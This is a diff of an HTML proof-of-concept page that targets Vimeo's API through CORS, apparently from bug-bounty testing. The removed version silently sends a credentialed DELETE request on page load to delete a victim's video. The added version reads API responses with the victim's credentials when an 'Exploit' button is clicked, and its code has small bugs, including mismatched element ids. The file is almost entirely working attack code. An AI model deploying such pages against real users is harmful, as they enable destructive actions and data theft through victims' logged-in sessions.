@@ -1,29 +1,26 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>Vimeo CORS Destructive Action PoC</title>
-</head>
-<body>
-<h1>Destructive Action PoC</h1>
-<p>This will attempt to delete one of your videos silently.</p>
-
-<script>
-(async () => {
-  try {
-    // Replace with a video ID from your test account
-    const videoId = "987654321";  
-
-    const resp = await fetch(`https://api.vimeo.com/videos/${videoId}`, {
-      method: "DELETE",
-      credentials: "include"
-    });
-
-    alert("DELETE request sent! Response status: " + resp.status);
-
-  } catch (e) {
-    alert("Error: " + e);
-  }
-})();
-</script>
-</body>
+    <head>
+        <script>
+            function cors() {
+                var xhttp=new XMLHttpRequest();
+                    xhttp.onreadystatechange= function() {
+                        if (this.readyState == 4 && this.status ==200){
+                            document.getElementById("emo").innerHTML=alert(this.responseText
+                                );
+                        }
+                };
+                xhttp.open('GET',"https://api.vimeo.com/wp-json/",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
+        </script>
+    </head>
+    <body>
+        <center>
+        <h2>[!]CORS P0C - Qualw1n</h2>
+        <div id="demo">
+            <button type="button" onclick="cors()">Exploit</button> 
+        </div>
+        </center>
+    </body>
 </html>
